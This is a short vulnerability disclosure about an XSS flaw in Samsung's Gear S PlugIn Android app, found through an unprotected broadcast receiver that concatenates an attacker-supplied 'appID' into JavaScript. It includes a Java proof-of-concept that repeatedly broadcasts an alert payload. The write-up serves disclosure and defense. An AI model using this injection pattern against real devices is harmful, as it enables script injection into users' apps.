# Details

<table>
    <tr>
        <td>Name</td>
        <td>Gear S PlugIn</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.gearoplugin</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.17</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$220</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/089.%20Gear%20S%20PlugIn%20—%20XSS%20injection/Oversecured_report.png)

Oversecured found in the Gear S PlugIn app in the `com/samsung/android/gearoplugin/pm/webstore/activity/WebStoreWebViewActivity.java` file dynamic registration of an unprotected broadcast receiver. It accepted the `appID` parameter from the attacker, which was insecurely concatenated to JavaScript code, leading to XSS.

**Proof of Concept**

```java
new Thread(() -> {
    Intent i = new Intent("com.samsung.android.gearOPlugin.webviewuicontrol.SET_INSTALLED");
    i.putExtra("appID", "'-alert(1)-'");
    while (true) {
        sendBroadcast(i);
        try {
            Thread.sleep(500);
        } catch (Throwable th) {
            return;
        }
    }
}).start();
```

## References

- [Oversecured Blog. Android security checklist: WebView](https://blog.oversecured.com/Android-security-checklist-webview/)
